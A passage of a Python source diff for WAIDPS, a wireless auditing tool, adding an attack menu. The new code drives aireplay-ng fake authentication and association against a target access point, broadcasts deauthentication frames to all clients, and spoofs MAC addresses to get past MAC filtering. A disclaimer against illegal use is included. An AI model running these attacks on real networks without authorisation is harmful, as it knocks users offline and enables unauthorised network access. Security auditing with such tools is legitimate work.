+            printc (" ",fcolor.SWhite + Now() + " - " + fcolor.BGreen + "Sending Authentication Request [Shared Key] to Access Point [ " + fcolor.BYellow + str(__builtin__.ATTACK_AP_BSSID) + fcolor.BGreen + " ]... Attempt " + fcolor.BRed + str(WEP_ATTEMPT),"")
+        if readout.find('got deauth') != -1:
+            printc (" ",fcolor.SWhite + Now() + " - " + fcolor.SRed + "Got Deauthentication from Access Point [ " + fcolor.SYellow +str(TargetMAC) + fcolor.SGreen + " ] using " + fcolor.SYellow + str(__builtin__.SELECTED_ATK) + fcolor.SGreen + " [ " + fcolor.SYellow + str(ATK_MAC) + fcolor.SGreen + " ]... ","")
+        if readout.find('authentication 1/2 successful') != -1:
+            if READINGPKT=="1":
+                print "";READINGPKT=""
+            printc (" ",fcolor.SWhite + Now() + " - " + fcolor.BPink + "Authentication 1/2 Successful !!","")
+        if readout.find('authentication 2/2 successful') != -1:
+            if READINGPKT=="1":
+                print "";READINGPKT=""
+            printc (" ",fcolor.SWhite + Now() + " - " + fcolor.BPink + "Authentication 2/2 Successful !!","")
+            WEP_AUTHENTICATED=="1"
+        if readout.find('ap rejects the source mac') != -1:
+            printc (" ",fcolor.SWhite + Now() + " - " + fcolor.BRed + "Authentication Failed. Access Point [ " + fcolor.BYellow + str(__builtin__.ATTACK_AP_BSSID) + fcolor.BRed + " ] rejected your MAC [ " + fcolor.BYellow + str(__builtin__.SELECTED_ATK_MAC) + fcolor.BRed + " ]..!!","")
+            printc (" ",fcolor.SWhite + "                      " + fcolor.SRed + "Most likely is " + fcolor.BRed + "MAC Filtered" + fcolor.SRed + " Access Point. Try spoof a legitimate client MAC Address..","")
+        if readout.find('switching to shared key authentication') != -1:
+            if READINGPKT=="1":
+                print "";READINGPKT=""
+            printc (" ",fcolor.SWhite + Now() + " - " + fcolor.BRed + "BSSID [ " + fcolor.BYellow + str(__builtin__.ATTACK_AP_BSSID) + fcolor.BRed + " ] is likely using Shared Key Authentication..!!","")
+            printc (" ",fcolor.SWhite + Now() + " - " + fcolor.SRed + "Switching to Shared Key Authentication (SKA). ","")
+            WEP_SKA="1"
+        if readout.find('sending association request') != -1:
+            if READINGPKT=="1":
+                print "";READINGPKT=""
+            printc (" ",fcolor.SWhite + Now() + " - " + fcolor.BGreen + "Associating with Access Point [ " + fcolor.BYellow +str(TargetMAC) + fcolor.BGreen + " ] using " + fcolor.BYellow + str(__builtin__.SELECTED_ATK) + fcolor.BGreen + " [ " + fcolor.BYellow + str(ATK_MAC) + fcolor.BGreen + " ]... Attempt " + fcolor.BRed + str(WEP_ATTEMPT),"")
+        if readout.find('sending encrypted challenge. [ack]') != -1:
+            if READINGPKT=="1":
+                print "";READINGPKT=""
+            printc (" ",fcolor.SWhite + Now() + " - " + fcolor.SGreen + "Sending Encrypted Challenge to Access Point [ " + fcolor.SYellow + str(__builtin__.ATTACK_AP_BSSID) + fcolor.SGreen + " ].... Acknowledged...","")
+        if readout.find('not enough acks') != -1:
+            if READINGPKT=="1":
+                print "";READINGPKT=""
+            printc (" ",fcolor.SWhite + Now() + " - " + fcolor.SRed + "No enough acknowlegement.....","")
+        if readout.find('challenge failure') != -1:
+            if READINGPKT=="1":
+                print "";READINGPKT=""
+            printc (" ",fcolor.SWhite + Now() + " - " + fcolor.SRed + "Challenge Failed !!!","")
+            if len(NEWCLIENT)>1:
+                printc (" ",fcolor.SWhite + "                      " + fcolor.SGreen + str(len(NEWCLIENT)) + " clients found.. try spoofing legitimate client MAC to try...","")
+        if readout.find('attack was unsuccessful') != -1:
+            if READINGPKT=="1":
+                print "";READINGPKT=""
+            printc (" ",fcolor.SWhite + Now() + " - " + fcolor.BRed + "Fake Authentication was unsuccessfully !!","")
+            WEP_AUTH="1"
+            if WEP_SKA=="1":
+                WEP_SKA="2"
+        if readout.find('no such bssid available') != -1:
+            if READINGPKT=="1":
+                print "";READINGPKT=""
+            printc (" ",fcolor.SWhite + Now() + " - " + fcolor.SRed + "BSSID [ " + str(__builtin__.ATTACK_AP_BSSID) + " ] not found !!","")
+        if readout.find('is wpa in use') != -1:
+            if READINGPKT=="1":
+                print "";READINGPKT=""
+            printc (" ",fcolor.SWhite + Now() + " - " + fcolor.SRed + "Possible WPA Encryption for the Access Point....","")
+        if readout.find('association successful') != -1:
+            if READINGPKT=="1":
+                print "";READINGPKT=""
+            printc (" ",fcolor.SWhite + Now() + " - " + fcolor.BPink + "Client  [ " + fcolor.BYellow + str(ATK_MAC) + fcolor.BPink + " ] successfully associated with Access Point    [ " + fcolor.BYellow +str(TargetMAC) + fcolor.BPink + " ].","")
+            printc (" ",fcolor.SWhite + Now() + " - " + fcolor.BPink + "Fake Authentication Successful...","")
+            WEP_AUTH="1"
+        NEWCLIENT=GetClientFromCSV (FName)
+        if len(NEWCLIENT)>0:
+            __builtin__.CUR_CLIENT=__builtin__.NEW_CLIENT
+            ClentList=__builtin__.NEW_CLIENT
+            __builtin__.CUR_CLIENT_FS=__builtin__.NEW_CLIENT_FS
+            __builtin__.CUR_CLIENT_LS=__builtin__.NEW_CLIENT_LS
+            __builtin__.CUR_CLIENT_PWR=__builtin__.NEW_CLIENT_PWR
+            __builtin__.CUR_CLIENT_DATA=__builtin__.NEW_CLIENT_DATA
+            __builtin__.CUR_CLIENT_PROBE=__builtin__.NEW_CLIENT_PROBE
+        time.sleep(0.5)
+        if READINGPKT=="" and len(readout)>5:
+            WEP_ATTEMPT += 1
+        if WEP_OPN=="1" and WEP_ATTEMPT>=50 and WEP_SKA=="1":
+            WEP_AUTH="1";WEP_SKA="2"
+        
+        while sys.stdin in select.select([sys.stdin], [], [], 0)[0]:
+            usr_resp = sys.stdin.readline()
+            if usr_resp:
+                LineBreak()
+                MSG=""
+                MSG=MSG + tabspacefull +fcolor.BRed + "1 " + fcolor.SWhite + " - Quit Authentication\n" 
+                MSG=MSG + tabspacefull +fcolor.BRed + "2 " + fcolor.SWhite + " - Deauth All\n" 
+                MSG=MSG + tabspacefull +fcolor.BRed + "3 " + fcolor.SWhite + " - List clients\n"
+                MSG=MSG + tabspacefull +fcolor.BRed + "4 " + fcolor.SWhite + " - Spoof MAC Address\n" 
+                MSG=MSG + tabspacefull +fcolor.BRed + "0" + fcolor.SWhite + " - Return"
+                print MSG
+                usr_resp=AskQuestion("Select an option",fcolor.BRed + "0" + fcolor.BYellow + " - Return","U"," ","1")
+                if usr_resp=="1":
+                    if WEP_OPN=="1":
+                        WEP_AUTH="1"
+                    else:
+                        WEP_AUTH="2"
+                elif usr_resp=="2":
+                    DeauthBroadcast(__builtin__.ATTACK_AP_BSSID,__builtin__.SELECTED_MON,5)
+                elif usr_resp=="3":
+                    if len(__builtin__.CUR_CLIENT)>0 or len(DB_CLIENT)>0:
+                        if len(__builtin__.CUR_CLIENT)>0:
+                            ListClientFound()
+                        if len(DB_CLIENT)>0:
+                            ListClientFoundDB()
+                    else:
+                        printc ("!",fcolor.SRed + "No client found !!","")
+                        print "";printc ("x","","")
+                elif usr_resp=="4":
+                    ListClientFound()
+                    ListClientFoundDB()
+                    ChangeMACAddr(__builtin__.SELECTED_ATK,"")
+                    cmdLine="xterm -geometry 100x5-0-150 -iconic -bg black -fg white -fn 5x8 -title 'WAIDPS - Associating Access Point (Keep Alive)' -e 'aireplay-ng -1 6000 -o 1 -q 10 -a " + str(__builtin__.ATTACK_AP_BSSID)  + " -h " + str(__builtin__.SELECTED_ATK_MAC) + " " + str(AddESSID) + str(__builtin__.SELECTED_ATK) + " | tee " + str(authfile) + "'"
+                    ps=subprocess.Popen(cmdLine , shell=True, stdout=subprocess.PIPE,stderr=open(os.devnull, 'w'),preexec_fn=os.setsid)		
+                    __builtin__.Authenticator=ps.pid
+                    printc (".",fcolor.SWhite + Now() + " - " + fcolor.BPink + "Authenticating/Associating with Access Point [ " + fcolor.BYellow +str(TargetMAC) + fcolor.BPink + " ] using " + fcolor.BYellow + str(__builtin__.SELECTED_ATK) + fcolor.BPink + " [ " + fcolor.BYellow + str(ATK_MAC) + fcolor.BPink + " ]","")
+                else:
+                    retkey=""
+    if WEP_AUTH=="1":
+        if WEP_SKA=="2":
+            printc (" ",fcolor.SWhite + Now() + " - " + fcolor.BCyan + "Spoofing the legitimate client MAC (if any) to will have better chance of attacking success..","")
+        Search="WAIDPS - Associating"
+        KillProc(Search)
+        KillSubProc(str(__builtin__.Authenticator))
+        if IsFileDirExist(authfile)=="F":
+            DelFile (authfile,"")
+        print ""
+        printc (".",fcolor.SWhite + Now() + " - " + fcolor.BPink + "Sending keep-alive packet to Access Point [ " + fcolor.BYellow + str(TargetMAC) + fcolor.BGreen + " ]...","")
+        print ""
+        cmdLine="xterm -geometry 100x5-0-150 -iconic -bg black -fg white -fn 5x8 -title 'WAIDPS - Associating Access Point' -e 'aireplay-ng -1 6000 -o 1 -q 10 -a " + str(TargetMAC)  + " -h " + str(__builtin__.SELECTED_ATK_MAC) + " " + str(__builtin__.SELECTED_ATK) + "'"
+        ps=subprocess.Popen(cmdLine , shell=True, stdout=subprocess.PIPE,stderr=open(os.devnull, 'w'),preexec_fn=os.setsid)		
+        __builtin__.Authenticator=ps.pid
+    return WEP_AUTH
+
+def ReadAuthFile(AuthFile):
+    Result=""
+    if IsFileDirExist(AuthFile)=="F":
+	with open(AuthFile,"r") as f:
+	    for line in f:
+                sline=str(line).replace("\n","").lstrip().rstrip().lower()
+                if len(sline)>0:
+                    Result=Result + sline +"\n"
+    open(AuthFile,"w").write("")
+    return Result
+                
+                
+
+def DeauthBroadcast(BSSID,IFace,DeauthCt):
+    printl (tabspacefull + fcolor.BRed + "Broadcasting Deauthentication Signal To All Clients for " + fcolor.BGreen + str(BSSID) + fcolor.BRed + "..." + fcolor.SGreen + " (x" + str(DeauthCt) + ") ","0","")
+    cmd = [ "aireplay-ng","-0", str(DeauthCt),"-a", str(BSSID), str(IFace)]
+    ps = Popen(cmd, stdout=PIPE, stderr=open(os.devnull))
+    ps.wait()
+    print fcolor.BGreen + " Done !!"
+                            
+
+def ListClientFound():
+    if len(__builtin__.CUR_CLIENT)>0:
+        cl=0
+        printc ("i",fcolor.BBlue + "List of detected client MAC.","")
+        while cl<len(__builtin__.CUR_CLIENT):
+            OUI=Check_OUI(__builtin__.CUR_CLIENT[cl],"")
+            YourMAC=""
+            if __builtin__.CUR_CLIENT[cl]==__builtin__.SELECTED_ATK_MAC:
+                YourMAC=fcolor.SPink + " [Your Interface - ATK]"
+            if __builtin__.CUR_CLIENT[cl]==__builtin__.SELECTED_MON_MAC:
+                YourMAC=fcolor.SPink + " [Your Interface - MON]"
+            if __builtin__.CUR_CLIENT[cl]==__builtin__.SELECTED_MANIFACE_MAC:
+                YourMAC=fcolor.SPink + " [Your Interface - MAN]"
+            if __builtin__.CUR_CLIENT[cl]==__builtin__.SELECTED_IFACE_MAC:
+                YourMAC=fcolor.SPink + " [Your Interface - IFACE]"
+            printc (cl+1,fcolor.SWhite + "MAC ID : " + fcolor.BGreen + str(__builtin__.CUR_CLIENT[cl]) + "  " + fcolor.SCyan + str(OUI) + str(YourMAC),"")
+            cl=cl+1
+
+def ListClientFoundDB():
+    DB_CLIENT=[]
+    if IsFileDirExist(DBFile3)=="F":
+	with open(DBFile3,"r") as f:
+            next(f)
+	    for line in f:
+                line=line.replace("\n","")
+                tmpList=str(line).split(";")
+                if len(tmpList)>=7:
+                    if tmpList[1]==__builtin__.ATTACK_AP_BSSID:
+                        CLIENTMAC=str(tmpList[0])
+                        DB_CLIENT=AddToList(CLIENTMAC,DB_CLIENT)
+    DB_CLIENT.sort()
+    if len(DB_CLIENT)>0:
+        cl=0
+        printc ("i",fcolor.BBlue + "List of client MAC in Database.","")
+        while cl<len(DB_CLIENT):
+            OUI=Check_OUI(DB_CLIENT[cl],"")
+            YourMAC=""
+            if DB_CLIENT[cl]==__builtin__.SELECTED_ATK_MAC:
+                YourMAC=fcolor.SPink + " [Your Interface]"
+            printc (cl+1,fcolor.SWhite + "MAC ID : " + fcolor.BGreen + str(DB_CLIENT[cl]) + "  " + fcolor.SCyan + str(OUI) + str(YourMAC),"")
+            cl=cl+1
+        print ""
+
+def ChangeMACAddr(IFace,IFace2):
+    Result=""
+    CurMAC=GetMyMAC(IFace)
+    print ""
+    printc ("i",fcolor.SGreen + "The current MAC for " + fcolor.BYellow + str(IFace) + fcolor.SGreen + " is [ " + fcolor.BYellow + str(CurMAC) + fcolor.SGreen + " ]","")
+    ASSIGNED_MAC=str(AskQuestion("Enter the MAC to Spoof xx:xx:xx:xx:xx:xx :",fcolor.SWhite + "Default - Nil","U","NIL","")).lstrip().rstrip()
+    if ASSIGNED_MAC!="" and ASSIGNED_MAC!="NIL":
+        if len(ASSIGNED_MAC)!=17 or IsHex(ASSIGNED_MAC)==False:
+            printc ("!!!","Invalid MAC Address Entered !","")
+            print ""
+            ChangeMACAddr(IFace,IFace2)
+            return
+        else:
+            printc (".",fcolor.SGreen + "Spoofing current MAC [ " + fcolor.BYellow + str(CurMAC) + fcolor.SGreen +  " ] to [ " + fcolor.BYellow + str(ASSIGNED_MAC) + fcolor.SGreen + " ]..","")
+            ps=subprocess.Popen("ifconfig " + str(IFace) + " down && ip link set dev " + str(IFace) + " address " + str(ASSIGNED_MAC) + " && ifconfig " + str(IFace) + " up > /dev/null 2>&1", shell=True, stdout=subprocess.PIPE,stderr=open(os.devnull, 'w'))
+            ps.wait();ps.stdout.close()
+            NewMAC=GetMyMAC(IFace)
+            if str(NewMAC)!=str(ASSIGNED_MAC):
+                printc ("!!!","MAC Address Spoofing Failed !","")
+            else:
+                printc (".",fcolor.SGreen + "New MAC [ " + fcolor.BRed + str(NewMAC) + fcolor.SGreen +  " ].","")
+                __builtin__.SELECTED_ATK_MAC=str(NewMAC)
+                if IFace2!="":
+                    printc (".",fcolor.SGreen + "Spoofing current MAC [ " + fcolor.BYellow + str(CurMAC) + fcolor.SGreen +  " ] of interface [ " + fcolor.BRed + str(IFace2) + fcolor.SGreen + " ] to [ " + fcolor.BYellow + str(ASSIGNED_MAC) + fcolor.SGreen + " ]..","")
+                    ps=subprocess.Popen("ifconfig " + str(IFace2) + " down && ip link set dev " + str(IFace2) + " address " + str(ASSIGNED_MAC) + " && ifconfig " + str(IFace2) + " up > /dev/null 2>&1", shell=True, stdout=subprocess.PIPE,stderr=open(os.devnull, 'w'))
+                    ps.wait();ps.stdout.close()
+                    NewMAC=GetMyMAC(IFace2)
+                    if str(NewMAC)!=str(ASSIGNED_MAC):
+                        printc ("!!!","MAC Address Spoofing Failed !","")
+                    else:
+                        printc (".",fcolor.SGreen + "New MAC [ " + fcolor.BRed + str(NewMAC) + fcolor.SGreen +  " ].","")
+                Search="WAIDPS - Auditing"
+                KillProc(Search)
+                Search="WAIDPS - Associating"
+                KillProc(Search)
+                Result=str(NewMAC)
+    print ""
+    return Result
+
+def send_interrupt(process): 
+    try:
+	os.kill(process.pid, SIGINT) 
+    except OSError: pass           # process cannot be killed
+    except TypeError: pass         # pid is incorrect type
+    except UnboundLocalError: pass # 'process' is not defined
+    except AttributeError: pass    # Trying to kill "None"
+
 def GetOptionCommands(HeaderLine):
     RefreshAutoComplete("")
     if HeaderLine!="":
@@ -594,10 +4330,8 @@ def GetOptionCommands(HeaderLine):
         LineBreak()
         return;
     if usr_resp=="A":
-        printc ("+", fcolor.BBlue + "Wireless Auditing Menu","")
-        print tabspacefull + StdColor + "This option will be included in future release.";print ""
-        LineBreak()
-        return
+        OptAuditing("")
+        return;
     if usr_resp=="X":
         usr_resp=AskQuestion(fcolor.SRed + "Are you sure you want to exit" + fcolor.BGreen,"y/N","U","N","1")
         LineBreak()
@@ -637,6 +4371,10 @@ def GetOptionCommands(HeaderLine):
     if usr_resp=="H":
         OptDisplayLogs();LineBreak();return;
     return;
+
+def AUDITOR_WARNING():
+    CenterText(fcolor.BWhite + fcolor.BGRed, "WARNING - NOT FOR ILLEGAL USE")
+    print fcolor.SRed + "Disclaimer :- Usage of WAIDPS for attacking any network not belonging to you or without any prior mutual conssent of auditing the network is illegal. It is the user's responsibility to obey all applicable laws. Developers assume no liability and are not responsible for any misuse of WAIDPS.\n"
 
 def WaitingCommands(Timer=0, ShowDisplay=1):
     usr_resp=""
@@ -678,7 +4416,11 @@ def WaitingCommands(Timer=0, ShowDisplay=1):
                     GetFileDetail(__builtin__.PacketDumpFile)
                     FS=fcolor.SWhite + " Pkt Size : " + str(__builtin__.FileSize) 
                 
-                s=bcolor + "[" + pcolor + str(t) + bcolor + "]" + __builtin__.tabspace + tcolor + PrintText + str(FS) + "\r"
+                if len(str(t))==1:
+                    Spacing=__builtin__.tabspace
+                else:
+                    Spacing="  "
+                s=bcolor + "[" + pcolor + str(t) + bcolor + "]" + Spacing + tcolor + PrintText + str(FS) + "\r"
                 s=s.replace("%s",pcolor+str(PrintText2)+tcolor)
                 sl=len(s)
                 print s,
@@ -695,7 +4437,7 @@ def WaitingCommands(Timer=0, ShowDisplay=1):
                         RR=GetOptionCommands("1")
                         if RR=="TIME0":
                             t=0
-                c1=bcolor + "[" + pcolor + "-" + bcolor + "]" + __builtin__.tabspace + tcolor + PrintText + "\r"
+                c1=bcolor + "[" + pcolor + "-" + bcolor + "]" + Spacing + tcolor + PrintText + "\r"
                 c1=c1.replace("%s",pcolor+str(PrintText2)+tcolor)
                 print c1,
                 sys.stdout.flush()
@@ -706,6 +4448,45 @@ def WaitingCommands(Timer=0, ShowDisplay=1):
                 exit_gracefully(0)
             else:
                 return "";
+
+def WaitProcessing(Timer=0, ShowDisplay=1):
+    usr_resp=""
+    t=int(Timer)
+    bcolor=fcolor.SWhite
+    pcolor=fcolor.BGreen
+    tcolor=fcolor.SGreen
+    PrintText2=""
+    PrintText="Refreshing in " + str(Timer) + " seconds... Press " + fcolor.BYellow + "[Enter]" + fcolor.SGreen + " to interrupt... "
+    c1=PrintText
+    while t!=0:
+        FS=""
+        s=bcolor + "[" + pcolor + str(t) + bcolor + "]" + __builtin__.tabspace + tcolor + PrintText + str(FS) + "\r"
+        s=s.replace("%s",pcolor+str(PrintText2)+tcolor)
+        sl=len(s)
+        print s,
+        sys.stdout.flush()
+        time.sleep(1)
+        s=""
+        ss="\r"
+        print "" + s.ljust(sl+2) + ss,
+        sys.stdout.flush()
+        t=t-1
+        while sys.stdin in select.select([sys.stdin], [], [], 0)[0]:
+            usr_resp = sys.stdin.readline()
+            if usr_resp:
+                s="";ss="\r";print "" + s.ljust(sl+2) + ss,
+                sys.stdout.flush() 
+                return "1";
+        c1=bcolor + "[" + pcolor + "-" + bcolor + "]" + __builtin__.tabspace + tcolor + PrintText + "\r"
+        c1=c1.replace("%s",pcolor+str(PrintText2)+tcolor)
+        print c1,
+        sys.stdout.flush()
+    sl=len(c1)
+    s=""
+    ss="\r"
+    print "" + s.ljust(sl+2) + ss,
+    sys.stdout.flush()
+    return "";
 
 def DisplayClientDetail(DisplayTitle,DataList):
     tmpList = []
@@ -761,6 +4542,8 @@ def RemoveUnwantMAC(MACAddr):
         if MAC_ADR[:3]=="FF:":
             sMAC[ax]=""
         if MAC_ADR==str(__builtin__.SELECTED_MON_MAC):
+            sMAC[ax]=""
+        if MAC_ADR==str(__builtin__.SELECTED_ATK_MAC):
             sMAC[ax]=""
         if MAC_ADR==str(__builtin__.SELECTED_MANIFACE_MAC):
             sMAC[ax]=""
@@ -1037,12 +4820,17 @@ def DisplayStationDetail():
 def DisplayMyMAC():
     print fcolor.BWhite + tabspacefull + "Selected Interface : " +  fcolor.BGreen + str(__builtin__.SELECTED_IFACE_MAC).ljust(20) + fcolor.BWhite + " [" + fcolor.BRed + str(__builtin__.SELECTED_IFACE) + fcolor.BWhite + "]"
     print fcolor.BWhite + tabspacefull + "Monitor Interface  : " +  fcolor.BGreen + str(__builtin__.SELECTED_MON_MAC).ljust(20) + fcolor.BWhite + " [" + fcolor.BRed + str(__builtin__.SELECTED_MON) + fcolor.BWhite + "]"
+    print fcolor.BWhite + tabspacefull + "Attacks Interface  : " +  fcolor.BGreen + str(__builtin__.SELECTED_ATK_MAC).ljust(20) + fcolor.BWhite + " [" + fcolor.BRed + str(__builtin__.SELECTED_ATK) + fcolor.BWhite + "]"
     print fcolor.BWhite + tabspacefull +"Managed Interface  : " +  fcolor.BGreen + str(__builtin__.SELECTED_MANIFACE_MAC).ljust(20) + fcolor.BWhite + " [" + fcolor.BRed + str(__builtin__.SELECTED_MANIFACE) + fcolor.BWhite + "]"
 
 def LookupMAC(sMACAddr):
     __builtin__.SELECTTYPE="MAC"
     __builtin__.MatchBSSIDCt=0
     __builtin__.MatchStationCt=0
+    __builtin__.ShowStationList=[]
+    __builtin__.ShowStationList2=[]
+    __builtin__.ShowBSSIDList=[]
+    __builtin__.ShowBSSIDList2=[]
     if sMACAddr=="":
         usr_resp=AskQuestion("Enter the MAC to lookup for","xx:xx:xx:xx:xx:xx","U"," ","")
     else:
@@ -1102,7 +4890,7 @@ def LookupMAC(sMACAddr):
                 ToDisplay=1
             if ToDisplay==1:
                 YOURMAC=""
-                if ListInfo_BSSID[i]==__builtin__.SELECTED_MANIFACE_MAC or ListInfo_BSSID[i]==__builtin__.SELECTED_MON_MAC or ListInfo_BSSID[i]==__builtin__.SELECTED_IFACE_MAC:
+                if ListInfo_BSSID[i]==__builtin__.SELECTED_MANIFACE_MAC or ListInfo_BSSID[i]==__builtin__.SELECTED_MON_MAC or ListInfo_BSSID[i]==__builtin__.SELECTED_IFACE_MAC or ListInfo_BSSID[i]==__builtin__.SELECTED_ATK_MAC:
                     YOURMAC=fcolor.BRed + " [YOUR MAC]"
                 print tabspacefull + fcolor.SGreen + "Found Match : " + fcolor.SWhite + str(ListInfo_BSSID[i]) + fcolor.SGreen + " (BSSID)" + str(YOURMAC)
             i += 1
@@ -1131,7 +4919,7 @@ def LookupMAC(sMACAddr):
                 ToDisplay=1
             if ToDisplay==1:
                 YOURMAC=""
-                if ListInfo_STATION[i]==__builtin__.SELECTED_MANIFACE_MAC or ListInfo_STATION[i]==__builtin__.SELECTED_MON_MAC or ListInfo_STATION[i]==__builtin__.SELECTED_IFACE_MAC:
+                if ListInfo_STATION[i]==__builtin__.SELECTED_MANIFACE_MAC or ListInfo_STATION[i]==__builtin__.SELECTED_MON_MAC or ListInfo_STATION[i]==__builtin__.SELECTED_IFACE_MAC or ListInfo_STATION[i]==__builtin__.SELECTED_ATK_MAC:
                     YOURMAC=fcolor.BRed + " [YOUR MAC]"
                 print tabspacefull + fcolor.SGreen + "Found Match : " + fcolor.SWhite + str(ListInfo_STATION[i]) + fcolor.SGreen + " (Station)" + str(YOURMAC)
             i += 1
@@ -1140,6 +4928,10 @@ def LookupName(sName):
     __builtin__.SELECTTYPE="NAME"
     __builtin__.MatchBSSIDCt=0
     __builtin__.MatchStationCt=0
+    __builtin__.ShowStationList=[]
+    __builtin__.ShowStationList2=[]
+    __builtin__.ShowBSSIDList=[]
+    __builtin__.ShowBSSIDList2=[]
     if sName=="":
         usr_resp=AskQuestion("Enter the Name to lookup for","",""," ","")
     else:
@@ -1184,7 +4976,7 @@ def LookupName(sName):
                 ToDisplay=1
             if ToDisplay==1:
                 YOURMAC=""
-                if ListInfo_BSSID[i]==__builtin__.SELECTED_MANIFACE_MAC or ListInfo_BSSID[i]==__builtin__.SELECTED_MON_MAC or ListInfo_BSSID[i]==__builtin__.SELECTED_IFACE_MAC:
+                if ListInfo_BSSID[i]==__builtin__.SELECTED_MANIFACE_MAC or ListInfo_BSSID[i]==__builtin__.SELECTED_MON_MAC or ListInfo_BSSID[i]==__builtin__.SELECTED_IFACE_MAC  or ListInfo_BSSID[i]==__builtin__.SELECTED_ATK_MAC:
                     YOURMAC=fcolor.BRed + " [YOUR MAC]"
                 print tabspacefull + fcolor.SGreen + "Found Match : " + fcolor.SWhite + str(ListInfo_BSSID[i]) + fcolor.SGreen + " (ESSID)\t\tESSID : " + fcolor.SPink + str(ListInfo_ESSID[i]) + str(YOURMAC)
             i += 1
@@ -1229,7 +5021,7 @@ def LookupName(sName):
                 j += 1
             if ToDisplay==1:
                 YOURMAC=""
-                if ListInfo_STATION[i]==__builtin__.SELECTED_MANIFACE_MAC or ListInfo_STATION[i]==__builtin__.SELECTED_MON_MAC or ListInfo_STATION[i]==__builtin__.SELECTED_IFACE_MAC:
+                if ListInfo_STATION[i]==__builtin__.SELECTED_MANIFACE_MAC or ListInfo_STATION[i]==__builtin__.SELECTED_MON_MAC or ListInfo_STATION[i]==__builtin__.SELECTED_IFACE_MAC  or ListInfo_BSSID[i]==__builtin__.SELECTED_ATK_MAC:
                     YOURMAC=fcolor.BRed + " [YOUR MAC]"
                 print tabspacefull + fcolor.SGreen + "Found Match : " + fcolor.SWhite + str(ListInfo_STATION[i]) + fcolor.SGreen + " (Station Probe)\tProbe : " + fcolor.SBlue + str(FoundProbe) + str(YOURMAC)
             i += 1
@@ -1334,6 +5126,8 @@ def OptFilterDisplay(HeaderLine):
             __builtin__.NETWORK_SIGNAL_FILTER="ALL"
             __builtin__.NETWORK_CHANNEL_FILTER="ALL"
             __builtin__.NETWORK_WPS_FILTER="ALL"
+            __builtin__.NETWORK_ESSID_FILTER=""
+            __builtin__.NETWORK_BSSID_FILTER=""
             __builtin__.NETWORK_CLIENT_FILTER="ALL"
             printc (" ","All Filters Cleared !","")
             OptFilterDisplay("1")
@@ -1347,10 +5141,12 @@ def OptFilterDisplay(HeaderLine):
         Option4 = tabspacefull + SelBColor + "3" + StdColor + "/" + SelBColor + "C" + StdColor + " - " + SelColor + "C" + StdColor + "hannel\n"
         Option5 = tabspacefull + SelBColor + "4" + StdColor + "/" + SelBColor + "N" + StdColor + " - Clie" + SelColor + "n" + StdColor + "t\n"
         Option6 = tabspacefull + SelBColor + "5" + StdColor + "/" + SelBColor + "W" + StdColor + " - " + SelColor + "W" + StdColor + "PS\n"
-        Option7 = tabspacefull + SelBColor + "9" + StdColor + "/" + SelBColor + "X" + StdColor + " - " + SelColor + "" + StdColor + "Clear Filter\n"
-        OptionA=Option1 + Option2 + Option3 + Option4 + Option5 + Option6 + Option7
+        Option7 = tabspacefull + SelBColor + "6" + StdColor + "/" + SelBColor + "I" + StdColor + " - ESS" + SelColor + "I" + StdColor + "D\n"
+        Option8 = tabspacefull + SelBColor + "7" + StdColor + "/" + SelBColor + "B" + StdColor + " - " + SelColor + "B" + StdColor + "SSID\n"
+        Option9 = tabspacefull + SelBColor + "9" + StdColor + "/" + SelBColor + "X" + StdColor + " - " + SelColor + "" + StdColor + "Clear Filter\n"
+        OptionA=Option1 + Option2 + Option3 + Option4 + Option5 + Option6 + Option7+ Option8 + Option9
         print OptionA
-        usr_resp=AskQuestion("Choose an option / " + STxt + "R" + NTxt + "eturn","E/S/C/N/W/X","U","RETURN","1")
+        usr_resp=AskQuestion("Choose an option / " + STxt + "R" + NTxt + "eturn","E/S/C/N/W/I/B/X","U","RETURN","1")
         if usr_resp=="RETURN":
             OptFilterDisplay("1")
             return
@@ -1361,6 +5157,8 @@ def OptFilterDisplay(HeaderLine):
             __builtin__.NETWORK_CHANNEL_FILTER="ALL"
             __builtin__.NETWORK_WPS_FILTER="ALL"
             __builtin__.NETWORK_CLIENT_FILTER="ALL"
+            __builtin__.NETWORK_ESSID_FILTER=""
+            __builtin__.NETWORK_BSSID_FILTER=""
             printc (" ","Access Point Filtration Cleared !","")
             OptFilterDisplay("1")
             return;
@@ -1429,6 +5227,26 @@ def OptFilterDisplay(HeaderLine):
                 __builtin__.NETWORK_WPS_FILTER="Yes"
             if usr_resp=="2" or usr_resp=="N" or usr_resp=="NO":
                 __builtin__.NETWORK_WPS_FILTER="No"
+            OptFilterDisplay("1")
+            return;
+        elif usr_resp=="6" or usr_resp=="I":
+            if __builtin__.NETWORK_ESSID_FILTER!="":
+                printc (" " , fcolor.BWhite + "Current Filter = " + SelBColor + str(NETWORK_ESSID_FILTER), "")
+            usr_resp=AskQuestion("Enter the ESSID to filter ",StdColor + "RETURN = Remove/Cancel","U","<<CLEAR>>","")
+            if usr_resp=="<<CLEAR>>":
+                __builtin__.NETWORK_ESSID_FILTER=""
+            else:
+                __builtin__.NETWORK_ESSID_FILTER=usr_resp
+            OptFilterDisplay("1")
+            return;
+        elif usr_resp=="7" or usr_resp=="B":
+            if __builtin__.NETWORK_BSSID_FILTER!="":
+                printc (" " , fcolor.BWhite + "Current Filter = " + SelBColor + str(NETWORK_BSSID_FILTER), "")
+            usr_resp=AskQuestion("Enter the BSSID to filter ",StdColor + "RETURN = Remove/Cancel","U","<<CLEAR>>","")
+            if usr_resp=="<<CLEAR>>":
+                __builtin__.NETWORK_BSSID_FILTER=""
+            else:
+                __builtin__.NETWORK_BSSID_FILTER=usr_resp
             OptFilterDisplay("1")
             return;
     if usr_resp=="2" or usr_resp=="S":
@@ -1543,7 +5361,7 @@ def OptFilterDisplay(HeaderLine):
         elif usr_resp=="1" or usr_resp=="P":
             if __builtin__.NETWORK_UPROBE_FILTER!="ALL":
                 printc (" " , fcolor.BWhite + "Current Filter = " + SelBColor + str(NETWORK_UPROBE_FILTER), "")
-            usr_resp=AskQuestion("Display only if unassociated station having probe names",SelColor + "Y" + StdColor + "es / " + SelColor + "N" + StdColor + "o","U","ALL","1")
+            usr_resp=AskQuestion("Display only if unassociated station having probe names",SelColor + "Y" + StdColor + "es / " + SelColor + "N" + StdColor + "o","U","RETURN","1")
             __builtin__.NETWORK_UPROBE_FILTER="ALL"
             if usr_resp=="1" or usr_resp=="Y" or usr_resp=="YES":
                 __builtin__.NETWORK_UPROBE_FILTER="Yes"
@@ -1583,14 +5401,16 @@ def OptFilterDisplay(HeaderLine):
             return;
 
 def KillSubProc(sProc):
-    cmdLine="ps -eo pid | grep '" + str(sProc) + "'"
